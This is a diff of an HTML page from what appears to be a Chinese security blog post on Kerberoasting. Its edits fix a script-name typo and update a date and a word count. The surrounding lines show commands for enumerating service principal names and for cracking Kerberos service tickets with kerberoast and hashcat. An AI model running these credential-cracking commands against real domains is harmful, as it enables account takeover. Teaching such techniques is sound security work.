@@ -432,7 +432,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-07
+                    2021-09-23
                 </div>
                 
 
@@ -681,7 +681,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210907113159.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>将 MSSQL 服务所对应的票据复制到有 kerberoast 的机器上，之后用 kerberoast 中的 tgsreperack.py 脚本破解票据的 NTLM Hash</p>
 <p>Kerberoast 脚本下载地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p>
-<pre class="line-numbers language-none"><code class="language-none">python tgsreperack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">python tgsrepcrack.py password.txt mssql.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>或者使用 hashcat 破解 powershell 脚本、Rubeus、impacket 获取到的服务票据</p>
 <pre class="line-numbers language-none"><code class="language-none">hashcat -m 13100 &#x2F;tmp&#x2F;hash.txt &#x2F;tmp&#x2F;password.list -o found.txt --force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -1125,7 +1125,7 @@ setspn -q *&#x2F;* | Select-String &#39;^CN&#39; -Context 0,1 | % &#123; New-Obj
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">175.3k</span>&nbsp;字
+                class="white-color">178.1k</span>&nbsp;字
             
             
             
